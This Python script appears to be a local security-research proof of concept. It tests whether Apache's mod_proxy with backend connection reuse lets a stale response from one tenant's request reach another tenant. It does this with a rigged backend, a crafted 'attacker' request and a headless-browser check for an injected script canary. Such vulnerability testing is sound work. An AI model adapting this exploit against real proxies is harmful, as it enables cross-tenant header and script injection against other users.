#!/usr/bin/env python3
"""Probe high-impact consequences of the Candidate B response boundary.

This is an impact probe, not a production-trigger claim.  It keeps the
attacker's A input separate from B's request and asks whether a stale A-side
response can become B's response headers/body under pooled reuse.  A browser
canary is deliberately harmless: it only changes document.title.
"""

from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import tempfile
import threading
import time
from pathlib import Path


def read_response(sock: socket.socket) -> bytes:
    sock.settimeout(5)
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(8192)
        if not chunk:
            raise RuntimeError(f"incomplete response headers: {data!r}")
        data += chunk
    head, body = data.split(b"\r\n\r\n", 1)
    length = next(
        int(line.split(b":", 1)[1].strip())
        for line in head.split(b"\r\n")
        if line.lower().startswith(b"content-length:")
    )
    while len(body) < length:
        body += sock.recv(8192)
    return head + b"\r\n\r\n" + body[:length]


def read_headers(sock: socket.socket) -> bytes:
    sock.settimeout(5)
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(8192)
        if not chunk:
            raise RuntimeError(f"incomplete request: {data!r}")
        data += chunk
    return data


class ImpactBackend:
    def __init__(self, case: str, log_path: Path):
        self.case = case
        self.log_path = log_path
        self.listener = socket.socket()
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(4)
        self.port = self.listener.getsockname()[1]
        self.connections = 0
        self.error: Exception | None = None

    def log(self, line: str) -> None:
        with self.log_path.open("a", encoding="utf-8") as out:
            out.write(line + "\n")

    @staticmethod
    def b_response(body: bytes, *, content_type: bytes = b"text/plain") -> bytes:
        return (
            b"HTTP/1.1 200 OK\r\nContent-Type: " + content_type +
            b"\r\nContent-Length: " + str(len(body)).encode() +
            b"\r\nX-Tenant: B\r\nConnection: close\r\n\r\n" + body
        )

    def a_response(self) -> bytes:
        # The declared A body is complete from Apache's point of view.  The
        # impact payload is emitted only after B's request is observed.
        return b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"

    def stale_a_payload(self) -> bytes:
        if self.case == "headers":
            return (
                b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
                b"X-A-Controlled: A_ONLY\r\nContent-Length: 11\r\n"
                b"Connection: close\r\n\r\nA-CONTROLLED"
            )
        html = (
            b"<!doctype html><html><head><title>B_SAFE</title></head>"
            b"<body><script>document.title='A_CONTROLLED_CANARY'</script>"
            b"</body></html>"
        )
        return self.b_response(html, content_type=b"text/html")

    def serve_connection(self, conn: socket.socket, first: bool) -> bool:
        with conn:
            request = read_headers(conn)
            self.log(f"request={request.splitlines()[0]!r} first={first}")
            if first:
                conn.sendall(self.a_response())
                self.log("sent=A_declared_response")
                try:
                    request_b = read_headers(conn)
                except RuntimeError:
                    self.log("first_connection_closed_before_B")
                    return False
                self.log(f"request_b={request_b.splitlines()[0]!r}")
                conn.sendall(self.stale_a_payload())
                self.log(f"sent=stale_A_payload case={self.case}")
            else:
                conn.sendall(self.b_response(b"B_SAFE"))
                self.log("sent=B_control")
            return True

    def run(self) -> None:
        try:
            first, _ = self.listener.accept()
            self.connections += 1
            reused = self.serve_connection(first, True)
            # With reuse disabled Apache opens a fresh backend connection for
            # B.  With reuse enabled the first connection already supplied B.
            if reused:
                return
            self.listener.settimeout(1.5)
            second, _ = self.listener.accept()
            self.connections += 1
            self.serve_connection(second, False)
        except Exception as exc:  # surfaced by the caller after the probe
            self.error = exc
        finally:
            self.listener.close()


def wait_for_port(port: int, process: subprocess.Popen[str], label: str) -> None:
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        if process.poll() is not None:
            raise RuntimeError(f"{label} exited: {process.stderr.read()}")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"{label} did not listen")


def run_probe(args: argparse.Namespace, case: str, browser: str | None) -> None:
    with tempfile.TemporaryDirectory(prefix=f"high-impact-{case}-") as tmp:
        root = Path(tmp)
        backend = ImpactBackend(case, root / "backend.log")
        config = root / "httpd.conf"
        reuse = " disablereuse=On" if args.disablereuse else ""
        config.write_text(f"""\
ServerRoot "{args.server_root}"
Listen 127.0.0.1:18080
PidFile "{root / 'httpd.pid'}"
ErrorLog "{root / 'error.log'}"
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
ProxyPass / http://127.0.0.1:{backend.port}/ retry=0{reuse}
ProxyPassReverse / http://127.0.0.1:{backend.port}/
""")
        thread = threading.Thread(target=backend.run, daemon=True)
        thread.start()
        apache = subprocess.Popen(
            [str(args.httpd), "-f", str(config), "-DFOREGROUND", "-X"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            env={**os.environ, "APACHE_RUN_DIR": str(root)},
        )
        try:
            wait_for_port(18080, apache, "Apache")
            with socket.create_connection(("127.0.0.1", 18080), timeout=5) as attacker:
                attacker.sendall(
                    b"GET /tenant-a/a?attacker_input=A_ONLY HTTP/1.1\r\n"
                    b"Host: tenant-a.example\r\nConnection: keep-alive\r\n\r\n"
                )
                response_a = read_response(attacker)
            if not response_a.endswith(b"OK"):
                raise AssertionError(f"unexpected A response: {response_a!r}")

            if case == "headers":
                with socket.create_connection(("127.0.0.1", 18080), timeout=5) as victim:
                    victim.sendall(
                        b"GET /tenant-b/b HTTP/1.1\r\nHost: tenant-b.example\r\n"
                        b"Connection: close\r\n\r\n"
                    )
                    response_b = read_response(victim)
                observed = b"X-A-Controlled: A_ONLY" in response_b
                print(f"headers_response_b={response_b!r}")
                print(f"headers_cross_tenant_control={observed}")
            else:
                if not browser:
                    raise RuntimeError("browser executable is required for html case")
                command = [
                    browser, "--headless", "--no-sandbox", "--disable-gpu",
                    "--no-proxy-server", "--dump-dom", "--virtual-time-budget=1000",
                    "--host-resolver-rules=MAP tenant-b.example 127.0.0.1",
                    "http://tenant-b.example:18080/tenant-b/b",
                ]
                browser_run = subprocess.run(
                    command, capture_output=True, text=True, timeout=15,
                    env={**os.environ, "NO_PROXY": "*", "no_proxy": "*"},
                )
                dom = browser_run.stdout.encode()
                observed = b"A_CONTROLLED_CANARY" in dom
                print(f"browser_exit={browser_run.returncode}")
                print(f"browser_dom={browser_run.stdout[:2000]!r}")
                print(f"browser_cross_tenant_script={observed}")

            thread.join(timeout=3)
            if backend.error:
                raise backend.error
            print(f"case={case} disablereuse={args.disablereuse} backend_connections={backend.connections}")
            expected = args.disablereuse is False
            if observed != expected:
                raise AssertionError(
                    f"unexpected impact result observed={observed} expected={expected}"
                )
        finally:
            apache.terminate()
            try:
                apache.wait(timeout=3)
            except subprocess.TimeoutExpired:
                apache.kill()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--browser", type=str)
    parser.add_argument("--disablereuse", action="store_true")
    parser.add_argument("--case", choices=["all", "headers", "html"], default="all")
    args = parser.parse_args()
    browser = args.browser or shutil.which("chromium") or shutil.which("chromium-browser")
    cases = ["headers", "html"] if args.case == "all" else [args.case]
    for case in cases:
        run_probe(args, case, browser)
        control_values = vars(args).copy()
        control_values["disablereuse"] = True
        control = argparse.Namespace(**control_values)
        run_probe(control, case, browser)
    print("high_impact_probe=passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
